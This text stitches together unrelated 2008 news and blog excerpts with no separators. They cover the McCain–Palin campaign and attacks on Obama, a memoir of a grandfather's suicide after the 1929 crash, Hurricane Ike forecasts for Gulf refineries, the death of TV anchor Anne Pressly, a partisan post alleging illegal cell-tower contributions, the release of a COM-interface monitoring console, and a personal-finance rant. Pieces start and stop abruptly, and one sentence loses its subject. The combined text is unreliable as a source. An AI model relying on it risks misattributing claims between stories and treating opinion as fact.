Mrs Palin becomes only the second woman , the first being Democrat Geraldine Ferraro in 1984 , to run for the US vice - presidency .
' Integrity and courage ' Speaking ahead of Mr McCain 's address , senior Republicans praised his courage and leadership .
I have to say , from my vantage point next to the DC delegation , my overall impression was that the audience in the hall were disappointed
BBC North America editor Justin Webb
Read Justin's thoughts in full Minnesota Governor Tim Pawlenty , at one point hotly tipped to be Mr McCain 's running mate choice , described the Arizona senator 's life as " a testimony to service , duty , courage and common sense " .
" In this time , we do n't need a president who can just read a poll or momentarily thrill a crowd .
We do n't need rhetoric or empty promises , " he said .
" We need a president who has the integrity and courage to make the tough choices so America will be stronger and safer . "
South Carolina Senator Lindsey Graham hailed Mr McCain 's determination to back the Bush administration 's " surge " strategy in Iraq despite the political risks .
HAVE YOUR SAY McCain is an experienced person and his speech impressed me Hariprasad Bhusal , India
He introduced a video presenting Alaska Governor Sarah Palin as a " maverick " moose - hunter from Alaska who was joining " the original maverick " Mr McCain to bring change to Washington politics .
In a well - received speech on Wednesday , Mrs Palin praised Mr McCain and attacked Mr Obama as having talked of change , but done nothing of substance .
President George W Bush has also strongly endorsed John McCain as the best man to succeed him in the White House .

The crash did not spark a wave of suicides
The Wall St Crash of 1929 is popularly remembered for stories of bankrupt investors throwing themselves to their deaths .
The grandfather of criminologist and film - maker Roger Graef was one of them .
Here he describes the tragic event 's effects on his father and himself , as well as the lessons he feels can be drawn from the crashes current and past .
I know that 1929 was very chaotic .
My grandfather was in insurance .
He had investments that all went south and he committed suicide by jumping off a roof .
It 's extraordinary how silent my family has been on that matter .
I thought how is it possible I have been so incurious about something as important as that in my family history .
I am rather ashamed of that now .
My grandfather was not a captain of industry .
He was selling insurance , he was I suppose more like Willie Loman in Death of a Salesman if anything .
He was a sad man who was trying to make his way , support his family , had invested in Wall Street with the hope and belief that that was going to do what he wanted to do which was create a safe and better future for his children .
My grandfather was apparently a gentle , warm , nice , man - my father regarded gentleness as weakness
That is an absolute common man 's objective , not a " masters of the universe " objective and the people who like him who would jump off the roof now are people running businesses on credit that has just dried up .
It wo n't be any of those bankers .
Do n't hold your breath , that 's not going to happen .
My father always regarded his father in a way that was so contemptuous of him .
My father was a young doctor making his way .
My family had had bumpy experiences - some were rich and did very well , others were not and my father was one who was n't from the rich side of the family and therefore becoming a doctor was a brave journey into proper middle - class establishment .
So suddenly when his father committed suicide he was left having to look after his mother and his brother and sister were not doing well enough to share the burden .
That was part of what he resented about the suicide .
Coldness legacy
My grandfather was apparently a gentle warm nice man .
My father regarded gentleness as weakness .
That he made very clear when I was trying to get closer to him .
THE SUICIDE MYTH A 1980s study suggested stories of widespread suicides of bankers in 1929 was myth Suicides in New York in month following crash lower than normal
Only eight people jumped off buildings in the city between the crash and the end of 1929 Just two were on Wall Street
There is a legacy from this suicide , because of my father 's coldness about a certain kind of intimacy and because the suicide created an anxiety about money .
My father was always on the lookout for bargains which slightly was passed down to me .
My father , as it were , mediating my grandfather 's suicide has allowed me to see his character traits as things that I 've tried very hard to avoid .
He was a very successful doctor , highly respected , but he had a very bad temper .
I had a feeling that the temper was about his situation .
It was n't just about whatever was going on .
I felt that he was ultimately angry because his father had left him holding not the baby , but his mother .
That was a root of the real dissatisfaction that permeated his attitude to life and fortunately with a lot of work I 've got rid of that notion that somehow you have the right to be angry because I have nothing to be angry about .
I 'm very lucky and I feel that now .
I know that the failures were part of that .
The crash caused serious privation for millions
My own view about life and opportunities was that we take our chances .
For example , failure is not a disaster .
I 've learned more from failure really than from success .
I hope that something in this current crash , something good that could come out of it is that people who have had telephone number salaries just for the sake of proving how virile they are have actually been forced , maybe , by failure to rethink not only their situation and what they do with their lives and how it affects other people , which would be very nice to hear from them , but also what the money 's for .
And , perhaps , it is possible to realise that having all that money becomes meaningless .
When every man jumps out of a window there is no satisfaction at all .
All you can say is poor bastard he actually believed the myth that it was all going to be alright and someone else was going to protect him .
And did n't .

The Republican accusations against Democratic presidential candidate Barack Obama have come fast and thick , from palling around with terrorists to being a tax - loving socialist .
But Obama has proven surprisingly adept at shrugging off rival John McCain 's attacks and opinion polls show McCain is the one whose image has suffered from the negativity .
Download the new Independent Premium app Sharing the full story , not just the headlines
" Obama has handled himself very calmly and in many ways has seemed steadier than McCain - and McCain has really helped him create that impression , " said Andrew Kohut , president of the Pew Research Center .
" He 's tried a lot of things .
Obama has done a good job of countering them . "
Obama 's resiliency has surprised Republican strategists who entered the campaign for the Nov. 4 election believing he was vulnerable to the sort of attacks that helped bring down recent Democratic candidates like John Kerry and Al Gore .
Republican consultant Kevin Madden , an aide to Mitt Romney during his presidential run and to President George W. Bush in 2004 , said Obama was helped by McCain 's failure to settle on a clear line of attack .
Bush hammered Kerry in 2004 as a " flip - flopper " for months until " about 40 days before the election , it kicked in , " Madden said .
Gore was relentlessly mocked in 2000 as an elitist who was out of step with mainstream America .
McCain , a veteran Arizona senator , flipped quickly through similar attacks and many more in the months since Obama clinched the Democratic nomination in June , never settling on a theme .
" The McCain campaign hit the reset button far too often , " Madden said .
" Obama emerged from the primaries with a lot of vulnerabilities but making those into liabilities required a very consistent focus that they never developed . "
During the summer , McCain mocked Obama as a political celebrity and elitist , criticized his shifting positions and made fun of his penchant for huge rallies and high - flying rhetoric .

But Republican hopes that Obama , a first - term Illinois senator , could be painted as dangerously inexperienced were negated by McCain 's choice of Sarah Palin , the nationally unknown first - term governor of Alaska , as his running mate .
Efforts to portray Obama as too liberal , with a history of associations like his service on a Chicago community board with a former 1960s radical , failed to gain steam as the economic crisis deepened and Obama performed steadily in a series of debates .
McCain 's reaction to the financial crisis - he initially called the fundamentals of the economy strong as it teetered then suspended his campaign to work on a bailout but resumed before it was completed - diminished his criticisms of Obama .
' Out of touch with the moment '
" McCain at times has appeared out of touch with the moment , " said Simon Rosenberg , head of the Democratic advocacy group NDN .
" While Americans are worried about their economic survival , he was talking about a 1960s radical . "
Nevertheless , McCain and Palin have cranked up the attacks again in recent days , describing Obama as a socialist for his plans to raise taxes on the wealthy and reduce them for lower - income workers .
They also have tried to link his campaign to allegations of voter registration fraud by the community group ACORN and painted him as risky after the weekend prediction by his running mate , Delaware Sen .
Joe Biden , that Obama would face an international crisis in his first six months in office .
McCain 's campaign has sponsored automated calls in battleground states stressing Obama 's links to Vietnam - era radical William Ayers .
At least two Republican senators have asked for the calls to end .
None of the attacks appears to have worked .
A Pew poll on Tuesday showed more voters now express doubt about McCain 's judgment than Obama 's and see McCain as less inspiring than Obama .
A majority say McCain has been too personally critical of Obama .
A Washington Post / ABC poll found majorities of undecided and persuadable voters do not believe Obama 's past relationship with Ayers or his campaign 's association with ACORN are legitimate election issues .
The Pew poll gave Obama a 14 - point lead nationally .
Two other polls , by Reuters / C- SPAN / Zogby and NBC News / Wall Street Journal , put Obama 's lead at 10 points .
Polls in many crucial states also give Obama an edge as McCain 's path to the 270 electoral votes needed to win the White House becomes increasingly difficult .
Republican consultant Rich Galen said McCain had two chances to strike real blows at Obama - after the successful Republican convention and after Obama 's speech to an adoring crowd in Berlin made him look like he was chasing global celebrity .
" They could n't capitalize in either case and they let Obama off the ropes , " Galen said .
" I do n't know that Obama was ever properly tested . "
Hurricane Ike 's current track predicts landfall within 100 miles of Galveston Saturday morning ; but the storm is n't strengthening much yet and the track has been moving northwards -- so , because of the wobbles in the track , models are still uncertain .
Within the current NHC storm path lies over 5 million bpd of US petroleum refining capacity .
( Perspective : 5 MMBBL is about 30 % of US capacity ( about 15 MMBBL ) , and a bit less than 6 % of global capacity ( ~85 MMBBL ) .
Also , the MMS reported Wednesday that staff has been evacuated from 452 production platforms ( 63.0 % ) and 81 rigs ( 66.9 % ) – ( 95.9 % of the oil production and 73.1 % of the natural gas production has been shut - in as a precautionary measure for Hurricane Ike . )

Current path estimates for Hurricane Ike ( Methaz GFDL Sep 11 ( 15:00 EDT ) - click twice to enlarge
For all graphics : Rigs / Platforms : Blue : evacuated only ;
Yellow will require inspection before restart ; Red : damage requiring repair ; Refineries : Black : operational impact ( partial shutdown ) Green : Operational impact ( full shutdown )
Red : Damage likely ; Ports : standard hurricane flags for wind
Here is the latest update from Chuck Watson at KAC / UCF as of 11 Sep 21:00 EDT :
Still waiting on strengthening .
Official NHC intensity forecast at a Cat 2 .
Hoping that this does n't blow up overnight .
We 'll know a lot more in the morning .
Relatively same forecast as earlier .
11 SEP 15:00 :
The latest track models are converging on the Houston area , between Freeport and High Island .
That 's bad news from a refinery perspective .
The question is increasingly shifting from " where " to " how strong " , and with Ike that 's a tough question to answer .
The threshold to watch for as the storm approaches landfall is 100 knots ( 115 m ph ) .
For every 5 knots less than that the damage drops off rapidly , and more importantly the recovery times improve .
If the storm landfall intensity is over 100 knots , we start to see damage that requires major structural work and therefore recovery times start to skyrocket .
The latest GFDL scenario is not pretty , and the refinery estimate from this morning ( nearly 6 MMBBL / day of refinery capacity for over a month , ( 38 % US / 5 % global capacity ) is in play .
I 'm still skeptical the surface winds will be over 100 kts at landfall .
The good news is that Ike is having a hard time getting organized .
There is a fair amount of dry are to the west , and if it gets entrained the storm will collapse .
The bad news is that Ike is still pushing the dry air out of the way , and there is still plenty of time for it to get organized .
Lots of discussion about the size of the wind field , and it is true that will elevate water levels and damage coastal property .
But from the oil / gas perspective , that does n't concern me as much as the organization of the winds in the core and damage swath .
HWRF essentially crashes the intensity to tropical storm strength before landfall - I think that 's pretty dramatic , but a cat1 landfall would n't surprise me .
A Cat 3 would .
Again , do n't bet your life on it - get out of the way !
I 'd leave the door open to a further east track as well - like Port Arthur - that 's a 1 in 3 in my thinking .
( 2 in 3 Houston , 1 in three to the east ) .
We will be posting periodic updates of track and damage forecasts here , because one never knows if one of these events will be seminal .
We 're not hurricane experts at theoildrum.com .
Thankfully we have an expert meteorologist who sends us track and damage forecasts relevant to oil and gas infrastructure .
What we try to do on this site , ( and have been doing for over 3 years ) , is articulate the fragility and urgency of our nation 's , and our world 's , energy situation .
As Hurricane
Ike moves nearer , and professional analysts gauge the impact it may have on our energy infrastructure , feel free to browse our archives of empirically based analyses and perspectives on the many aspects of our energy situation that form the backdrop not only for this hurricane , but for any exogenous event that disrupts the increasingly uneasy balance between energy supply and demand .
NHC Forecast for Hurricane Ike - click to go to Wunderground
Here are depictions of various Texas cities storm surge maps under different Hurricane scenarios from Weather Underground .
Regarding Port of Houston :
The Port of Houston is closing tonight as Hurricane Ike approaches , most coastal refineries will make storm decisions today , and offshore energy facilities are extending precautions they took just a week ago for Hurricane Gustav .
The Barbours Cut and Bayport terminals will shut down at noon today , and the port will close to all vessel traffic at midnight , spokeswoman Argentina James said .
The Port 's 25 - mile - long complex is a hub in the nation 's energy network .
Forecasts Wednesday evening projected Ike would come ashore Saturday between Corpus Christi and Galveston .
Port Freeport , about 65 miles south of Houston in a mandatory evacuation zone for Brazoria County , shut down early Wednesday afternoon and expects to reopen Monday , Chief Executive Pete Reixach said .
As vessel traffic declined , gasoline retailers were gearing up for a possible surge of evacuating motorists .
Motiva , a refining and retail gasoline joint venture between Shell Oil Co. and Saudi Arabia 's state - owned Aramco , said in a prepared statement that its coastal service stations and refueling terminals were being stocked up in anticipation of higher demand .
Shell - branded stations also were setting up generators to keep pumps running in the case of a power outage .
Here is the latest update from Chuck Watson at KAC / UCF as of 11 Sep 9:30 EDT :
Ike continues to wobble towards Texas - where is still an open question - and continues to not intensify .
As noted by NHC this morning , the interior structure of Ike is unusual .
It 's not unusual for a storm to have two eyewalls during what is called an eye replacement cycle ; it is unusual to maintain these structures over an extended period of time .
The outer wind maximum is helping to keep Ike weak ; if it collapses the inner core can strengthen rapidly .
I 'm still thinking mid Cat 3 is the max this storm will get , and high Cat 2 at landfall , but those who argue for Cat 4 could still be right if Ike gets his act together - I just do n't think that is likely .
As usual , take all such speculation with a grain of salt and if you are in the way of the storm get out .
( 9/10 16:30 EDT Update ) :
If the GFDL scenario plays out at Cat 3 or higher , current tracks are bad news for refining capacity .
The current GFDL scenario is very close to the LBAR scenario mentioned this morning .
Current track would take out long term 5 - 10 % of GOM production , but that 's not the problem .
So , if the GFDL scenario plays out at a Cat 3 or higher , we are looking at having 20 % of US refining capacity , and 5 % of global capacity , offline for a month or more .
Production side damage becomes irrelevant at that point .
Once again I 'd like to remind everyone that these discussions are with regard to a bunch of valuable , important , but ultimately replaceable hardware .
Follow the instructions of your local officials , and evacuate if that is recommended .
( Sep 10 11:30 EDT ) update , ( since revised , but it contains additional information )
It is vital to understand that very slight wobbles - even 10 - 20 miles - can make a huge difference in damage .
Remember that swath of heavy damage for most hurricanes , even intense ones , is only 50 - 75 miles wide .
Also recall that damage is exponential - 110 mph winds may be 10 % higher than 100 mph winds , but will cause 20 % more damage .
Chuck Watson has put together a dynamically updating page that will reflect the latest damage models / forecasts at this link : KAC / UCF models .
We will be updating this thread with damage estimate and breaking news as this story unfolds .
A note on our modeling process : we take the official NHC track , the raw computer model tracks like GFDL , HWRF , LBAR , etc , and even run our own in - house fast cycle track / intensity models .
These track and intensity estimates are feed to our main hurricane model ( TAOS ) , which computes the wind , waves , storm surge , currents , etc. at each point in our database of over 50,000 elements in the GoM like rigs , platforms , pipelines , pumping stations , refineries , etc .
We then have engineering models for each type of infrastructure that calculates the damage and estimated down time for that element , as well as downstream impacts ( eg if a pipeline is down , the upstream elements can't pump and the downstream elements do n't get product ) .
PRODUCTION /INFRASTRUCTURE
MAPS AND REFINERY INFORMATION
Here 's a link to a really good map of oil refining / SPR storage facilities in respect to the path of Katrina ( NB : OLD TRACK MAP ! ) and here is a listing of production and refining capability for the state of LA .
Just to give you a rough idea of where things are , the map above is a probability swath for Katrina ( OLD TRACK MAP ! ) with the Thunder Horse platform as the red dot , and the other purple dot represents the Mad Dog development ( 100,000 bd ) ; the Holstein development that produces at peak , around 100,000 bd of oil ; and the Atlantis field that may have ramped up to around 200,000 bd in all .
Put together these projects have the potential of around 650,000 bd , but as can be seen , they were sitting in an uncomfortable spot relative to the track of the Katrina .
The white dot is where Port Fourchon is .
This is where the Louisiana Offshore Oil Port , or LOOP , is located .
Rigzone pointed out that this is where the foreign tankers offload , Google and Terraserve maps you can see that the area is very low - lying .
One of the big concerns is that there will be sub-sea landslides or other ground movement that might affect the LOOP .
Were this to be disrupted , then foreign tankers would need to be diverted elsewhere , with the likely port being Houston .
Here is a really good link / map ( from " Rod and Reel " no less ) of the LA southern coastline showing all of the Submersible and Floater Gulf rigs .
We have accumulated resources from previous hurricans below , but we'd like to find updated materials if you know of them .
Recent refinery maps , recent rig maps in the gulf , recent gas fields , SPR facilities , the Intercoastal Canal , pipeline stations and transfer points , etc. , etc . Leave links in the comments please .
Also , here 's the EIA 's Alabama , Louisiana , Mississippi , and Texas Resources pages .
They will also likely come in handy .
Also , here 's a link to the national page .
Here 's another good resource for infrastructure maps and such .
( scroll down a bit )
Here 's a map from CNN with large and small refineries laid out .
( though it is an old storm track )
Very detailed piece by RIGZONE on rigs and other infrastructure in the area .

Note the many rigs on the east side of the storm that will get the brunt of the damage from the NE quad of the storm ... hence the high long - term GOMEX oil production damage estimates below .
Here 's a link to Rigzone 's coverage of Ike .
You want a detailed map ?
Well here 's the probably the best MMS map I could find .
Very detailed and lots of interesting stuff .

KATV Arkansas Anchorwoman Anne Pressly Dies 1982-2008
Anne Pressly 1982-2008
, 26 , died at St. Vincent Infirmary Medical Center on Saturday evening shortly after 7:00 p.m. , six days after being attacked by an unknown assailant at her home in Little Rock , Arkansas .
Doctors had remained hopeful but Pressly took a turn late in the week and her condition quickly deteriorated .
She was discovered by her mother on Monday morning when she did not answer her morning wake up call , just a half - hour before she was to appear on ABC affiliate KATV's Daybreak program .
Police continue to investigate and have found evidence of DNA in the anchorwoman 's home and are also reporting that Pressly 's credit card was used Monday at a gas station a few miles from her home .
Sgt. Cassandra Davis , a police spokeswoman , said that investigators believe she was the victim of a random attack .
Presley recently appeared in the new Oliver Stone movie W . She had a small role as a conservative commentator .
KATV opened their Saturday evening news program with a seven minute segment devoted to Pressly .
Her mother reported that her daughter expressed a desire to be an organ donor and her wishes were carried out .
Funeral arrangements are pending .

UPDATE : Murder suspect arrested .
As we reported last night , Verizon and AT&T ; made what may be illegal and unethical corporate contributions to John McCain , by installing free cell towers near one of his 12 homes to give him better cell reception after his wife complained .
It is illegal for corporations to give one dime to a candidate for federal office .
ILLEGAL .
That ’s why when AT&T ; and Verizon gave the McCains the free towers , and then had the nerve to say it was because he was a presidential candidate , it raised a few eyebrows , legal and ethical .
Now Verizon is claiming that they installed the towers at the request of the Secret Service .
Great answer .
Except the Washington Post just uncovered that it ’s a lie .
They agreed to build the towers , signed a contract with Cindy McCain to build the towers , BEFORE the Secret Service got involved .
So now we ’re back to whether AT&T ; & Verizon violated federal law by making an illegal contribution to John McCain ’s campaign , and whether John McCain violated Senate ethics rules as well .
Verizon spokesman Jeffrey Nelson attacked The Post ’s story as “ wrong , ” saying , “ Verizon received a request from Mrs. McCain , but declined .
Subsequent to that , the Secret Service made a legitimate request for a temporary tower for its work and Verizon complied as is required by our contract with the agency . ”
However , interviews and public records filed in the development services offices of Yavapai County , Ariz . , reveal a different timeline .
Getting cell coverage was the culmination of an effort begun in early 2007 by Cindy McCain , when her staff first requested coverage through Verizon ’s Web site , according to the McCain campaign .
After discussing the matter with the company , Mrs. McCain offered land for a permanent cell tower .
She gave Verizon authorization to act on her behalf to seek permits from the county .
Verizon hired contractors to draw up the plans and Cindy McCain signed a contract in May .
After a regulatory hurdle delayed installation of the permanent tower , Verizon received e-mails from the Secret Service asking about coverage in the area and asking for the process to be rushed .
Verizon ’s contractor then petitioned for a cell site on wheels .
It was installed in June .
So Verizon signed a contract with Cindy McCain on or before May of 2008 .
The Secret Service got involved in June , 2008 , a month later , AFTER the deal was signed .
Oct. 9 , 2008  -- Sen. John McCain acknowledged he is trailing Sen. Barack Obama in the 2008 presidential race , but says he long ago got used to being an " underdog " and willl keep fighting because he insists the Democratic nominee has neither the experience nor the candor to win the White House .
" This is a tough campaign , " McCain told ABC News ' Charlie Gibson in an exclusive interview .
" I 'm the underdog .
I 've always been the underdog from the beginning . "
And in a surprising tactic , McCain repeatedly invoked Democratic Sen. Hillary Clinton -- an unpopular figure among conservative Republicans -- while defending his campaign 's most controversial strategies : spending $ 300 billion to buy up peoples ' mortgages and linking Obama to 1960s anti-war radical William Ayers .
McCain was most heated when pressing his campaign 's attempts to connect Obama to Ayers , a co-founder of the Weather Underground , a Vietnam - era group that executed domestic bombings and plotted attacks on the U.S. Capitol and the Pentagon .
" [ Ayers ] was n't a guy in the neighborhood .
[ Obama ] launched his political career in his living room , in Mr. Ayers ' living room .
And I do n't care about two washed - up old terrorists that are unrepentant about trying to destroy America .
But I do care , and Americans should care , about his relationship with him and whether he 's being truthful and candid about it , " McCain said .
Obama says the personal attacks levied against him by the McCain campaign , particularly references to Ayers , are an attempt to " score cheap political points . "
" Why do n't we just clear it up right now , " Obama told " World News " anchor Gibson in an exclusive interview on Wednesday .
" I 'll repeat again what I 've said many times .
This is a guy who engaged in some despicable acts 40 years ago when I was eight years old .
By the time I met him , 10 or 15 years ago , he was a college professor of education at the University of Illinois . . .
And the notion that somehow he has been involved in my campaign , that he is an adviser of mine , that . . .
I 've ' palled around with a terrorist ' , all these statements are made simply to try to score cheap political points . "
But McCain was unrepentant when asked on Thursday by Gibson if Ayers is a " critical issue or factor in this campaign . "
" I think it 's a factor about Senator Obama 's candor and truthfulness with the American people , " McCain replied , before adding , " I do n't care about Mr. Ayers , who on Sept. 11 , 2001 , said he wished he'd have bombed more .
I do n't care about that .
I care about [ Obama ] being truthful about his relationship with him .
And Americans will care . "
Obama said on Wednesday to ABC News that the McCain campaign is making personal attacks " the centerpiece of the discussion in the closing weeks of a campaign where we are facing the worst economic crisis since the Great Depression and we 're in the middle of two wars . "
" I think that makes very little sense , not just to me but to the American people , " Obama said .
McCain demurred when asked whether Obama 's character or lack of candor disqualifies him to be president .
" I 'll leave that up to the American people .
But I have every right to insist that he be candid and truthful with the American people .
And he needs to be asked about it , and he needs to be forthcoming , " McCain said .
Obama had noted that McCain did n't raise the issue " to my face " in their debate on Tuesday , but McCain told Gibson he did not raise the Ayers argument during the debate because " it did n't come up in the flow of conversation . "
But McCain told Gibson he felt comfortable with the subject as a focus in the last days of the campaign .
" I think it 's something that needs to be examined .
Sen .
Clinton said it should be examined during their primary and it never was , " McCain said .
McCain Questions Obama 's Experience , Candor as Election Day Nears
McCain , who has thus far resisted engaging in some of the political attacks more often seen from his surrogates or Republican vice presidential nominee Sarah Palin on the campaign trail , repeatedly hinged his first direct discussion of Ayers on Obama 's primary rival , Sen. Hillary Clinton , D - N.Y .
" Sen . Clinton in their debates said that the American people did n't know enough about him , including his relationship with Mr. Ayers .
That 's what she said .
And I agree with that , " McCain said , rejecting the suggestion that Obama has been " thoroughly vetted " over the course of a near two - year battle for the White House .
" Does he have the experience and the knowledge and judgment and has he made the right decisions ? "
McCain asked in the Gibson interview , " and has he told -- been candid with the American people ?
I think that 's important . "
" They certainly know me , " McCain added , in reference to the American public .
Obama has rejected such a premise .
" The notion that people do n't know who I am is a little hard to swallow , " Obama told Gibson on Wednesday , " I 've been running for president for the last two years .
I 've campaigned in 49 states .
Millions of people have heard me speak at length on every topic under the sun .
I 've been involved now in 25 debates , going on my 26th .
And I 've written two books which any -- everybody who reads them will say are about as honest a set of reflections by , at least , a politician as are out there . "
It 's the Economy , Again
Obama suggested the McCain campaign 's turn toward personal attacks is an effort to avoid discussing the ailing economy .
" Sen. McCain 's campaign has been focusing on me primarily because they do n't want to focus on the economy .
And they 've said as much .
I mean , you 've had their spokespeople over the last couple of days say if we talk about the economic crisis , we lose , " Obama said .
But the economy was a top priority for McCain as world markets continue to struggle despite passage of a historic , $ 700 billion economic rescue package by Congress .
" We are in a crisis of unprecedented proportions .
And that 's why I recommended strongly that we go out and have the Treasury buy up these bad mortgages , so and arrange it as they did during the Depression , " McCain said , referring to a plan he proposed during the second presidential debate in Nashville on Tuesday .
" Sen. Clinton has recommended this , " McCain said .
" Buy up these mortgages .
Let people have them in affordable payment levels .
And put a floor on this continuing plummeting of housing -- of home prices .
As long as that value continues down , I do n't see a stabilization . "
But McCain 's plan has come under fire from both conservatives and the Obama campaign as one that rewards banks that knowingly provided the riskiest mortgages and bailing out irresponsible homeowners with the taxpayer 's money .
" This is a crisis of unprecedented proportions .
In many ways it 's the same situation we faced in the Great Depression .
. . .
Right now should we be bailing out all these institutions ?
Or should we be helping the homeowner in America ?
We may have to do both , but I 'd like to put the homeowner first , " McCain said .
McCain 's plan would cost an estimated $ 300 billion -- money , the Republican contender says that could be " part of the $ 700 billion [ economic rescue package ] , [ or ] new money , if necessary . "
Clinton spokeswoman Kathleen Strand reacted to word McCain had brought up the Clinton proposal in the interview , saying it was offensive to suggest his plan was the same as the Clinton plan .
" In the debate , John McCain took credit for coming up with a idea about mortgages , calling it his own proposal .
It 's offensive to suggest the new McCain plan is what Senator Clinton proposed .
She and Senator Obama are focused on helping struggling homeowners and holding bank lenders responsible .
The Bush - McCain strategy to sit back and do nothing is wreaking havoc on our economy .
Senator McCain 's new plan calls for bailing out and rewarding irresponsible bank and mortgage lenders , while sticking taxpayers with the bill , " Strand said in a statement .
Gibson asked how McCain would explain to voters why the country needs to buy up these mortgages as opposed to helping those struggling to pay their existing home mortgage .
" Because if your neighbor 's home value continues to decline , so is yours .
Your life savings -- and I appreciate that you were able to make your payments and struggles that you had .
But if your neighbor 's home continues to plummet in value and sits empty , then it 's going to affect your home as well .
So we 're doing this for you as well .
And hopefully we reach a floor on the home values , and yours and your neighbor 's homes can increase in value , " McCain said .
McCain Calls for Calm Amid Historic Economic Crisis
McCain defended the need for swift action on the economy but had sharp words for those taking credit for the the economic rescue plan , which he referred to as a " bailout . "
" Because of the corruption and cronyism in Washington , no one acted .
And it 's fascinating to me that the same people that are taking credit for the bailout , the Democrats , [ Sen . ]
Chris Dodd , [ Rep. ]
Barney Frank and others , were defending Fannie and Freddie and the corrupt practices they were doing .
I 'll tell you .
Life 's funny , " McCain said .
McCain called Freddie Mac and Fannie Mae -- mortgage lenders now owned by the government -- " the catalyst for this catastrophe , " but said now is the time for measured leadership .
" I 've never been accused of a lack of passion , " McCain told Gibson in their exclusive interview , " But the point is [ the American people ] also want firm , solid , measured , mature leadership .
Franklin Delano Roosevelt did n't go on the radio and start yelling .
He assured the American people .
Right now the American people need seasoned and experienced leadership .
That 's what I offer . "
Gibson challenged McCain on whether either candidate has been able to effectively sell their economic message in a clear , concise way .
" Americans ' faith and confidence is shaken , " McCain said .
" I think I saw a poll where five - percent of the American people think that they are -- that the country 's on the right track .
They must be the short sellers .
I have n't met anyone else .
Look , the American people are -- I do n't like to use the word fear because Americans by nature know we can overcome any challenge .
But they 're very badly shaken out there . "
" And Senator Obama wants to raise -- increase spending by $ 860 billion , " McCain continued .
" He wants to increase the taxes on 50 percent of small business income .
He 's been all over the place on all of his tax proposals .
I have the experience and the knowledge and the judgment to make the right decisions , including on reigning in the growth of government . "
The Arizona senator would not comment on whether his campaign had been hurting by weeks of bad economic news .
" I do n't know , Charlie .
I think by offering wise solutions and providing mature leadership that it 'll redound in my behalf , " he said .
But there is no question Obama 's growth in national polls as well as in key battleground states has coincided with the economic crisis .
" I 'm not going to complain about the hand I 'm dealt , my friend .
We 're coming up with solutions .
We 're trying to give the vision and leadership for the American people .
And I 'll accept their judgment , " he said .
Today we have released a console for monitoring and spying on applications using Microsoft ’s Component Object Model .
This technology is used in many professional applications and now you are able to watch them in action too !
Deviare ’s last integration is the ability to intercept COM interfaces .
Using this technology and heuristics to discover this interfaces , the console lets you see which interfaces are being used by an application , and how they made their calls .
Here is an example monitoring the Windows Live Messenger :
As you have seen , we found the instantiation of IwebBrowser2 .
Since we do n’t know what we want to see yet , we hooked every member except IDispatch ( not necessary here ) .
Then , the console printed calls for Navigate2 ( among others ) , and we could see where the little browser at the bottom of messenger was getting its Adverts from .
The console is open source , so feel free to contribute on it .
In this first release , it contains only one method to discover the creation of interfaces , but many others may be added .
Go chase them ; ) .

Obama 's Got More Bill Clinton In Him Than Hillary Ever Did
BROKAW : Senator Obama , if you would give us your list of priorities .
OBAMA : We 're going to have to prioritize , just like a family has to prioritize .
Now , I 've listed the things that I think have to be at the top of the list .
The U.S. Government wants you to stay perpetually broke .
The lenders and banks want you to stay in the poor house .
Why ?
Somewhere along the line the notion of saving money got perverted to the point that now people equate access to credit as actual money .
This psychological shift did n’t happen overnight but there is no doubt that many of our current economic struggles are rooted in this misguided perception .
Earlier this year a colleague called me up all worked up about something .
I asked what was going on and he conveyed to me that his home equity line had just been reduced .
Sacré bleu !
How dare the lender take away his money !
I had a really positive response to a previous article stating that you should only purchase a home that is 3 times your gross income .
One quick clarification is that I was referring to the actual mortgage amount and should have been clearer on that point .
In essence , you should not buy a home that carries a mortgage 3 times your gross yearly income .
However at the peak of the boom in California more and more people bought homes with no down payment :
We went from 3.9 % of all homebuyers purchasing homes with no down payment to 21.1 % of all homebuyers in 2006 at the peak of the bubble in California .
This was simply unsupportable .
Yet even given the current credit crisis , people are still able to buy homes with 10 % down and this is data from last month .
How can we figure that out ?
Let us look at some data :
“ ( DataQuick )
The typical monthly mortgage payment that Southern California buyers committed themselves to paying was $ 1,458 last month , down from $ 1,566 the previous month , and down from $ 2,198 a year ago .
Adjusted for inflation , current payments are 31.9 percent below typical payments in the spring of 1989 , the peak of the prior real estate cycle .
They are 44.4 percent below the current cycle ’s peak in June 2006 . ”
Since the vast majority of loans are now backed by the government , the prevailing rate for the summer was about 6 % .
It has gone up a bit but the above data would not reflect that .
The current Southern California median price is $ 308,500 .
With that , we can get a rough estimate of how much home buyers are putting down :
That gives us a good idea .
We are looking at 10 to 15 percent down for current homebuyers .
We are simply returning to more old school standards .
And this idea of no money down is another direct consequence of this notion that no one should save and delayed gratification is for chumps .
We are going to see a major shift in the next few years especially when there is a silent and disturbing economic depression going on already in our country .
Today we are going to look at 5 reasons why the U.S. Government wants you to remain a perpetually broke debt hamster that is motivated by spending .
Reason # 1 – U.S. Savings Instruments
One of the best kept secrets was the U.S. Savings I - Bond .
This simple instrument provided the purchaser a fixed rate and also a variable rate that adjusted with the CPI .
You know that I think the CPI is a cooked stew of economic alchemy but hey , it is what it is .
But at least this was a form for people to save money and be assured that they would n’t lose any money .
I started purchasing these things earlier in the decade and at the time , the rates seemed low given the tech bubble ( which bursted ) and the subsequent housing bubble ( which is now exploding ) .
But take a look how the government has decreased the actual fixed rate over time :
In fact , some of the bonds in the portfolio are now earning 7 % which is n’t a bad deal .
But look at how the government has slashed the fixed component of the bond to zero .
Now how does this encourage savings ?
So that is one strike .
They can easily increase the rate of savings for Americans by simply upping this rate .
In addition , buyers were also able to purchase up to $ 30,000 worth of these bonds a year .
So when I got an e-mail earlier this year that they were lowering the amount cap to $ 5,000 a year , I was getting a hint as to where the government was heading :
Okay , another strike .
Now those few folks who actually have some money to save in this struggling economy would be capped at $ 5,000 per year .
So if you had other money your options were to stick it into a mattress , stocks , or banks that seemed to be collapsing everyday .
They were limiting options creating an environment were the consumer was forced into riskier products .
Just look at the return on some institutional savings accounts :
This is for your run of the mill Bank of America savings account .
0.20 percent is almost comically low .
You might as well stuff your money into a mattress .
But going back to the I -Bonds which are offered through the U.S.
Treasury they also implemented this online security feature which makes it much more difficult to login :
For those who hold I - Bonds and other instruments you now need a plastic card to decode an online password that would make National Treasure seem like a walk in the park .
This is also after an online keyboard where you have to click with a mouse your password .
What this does is that it makes it utterly hard to save your account information in your browser to log back in .
Maybe one day you get a nice little bonus and you want to save it .
But your serial card is at home .
Too bad !
Why not log into your Amazon account and blow your money on reading Ben Bernanke ’s book on the Great Depression .
They ’ll even ship it out tonight with a one - click ship !
Where is the one - click save here ?
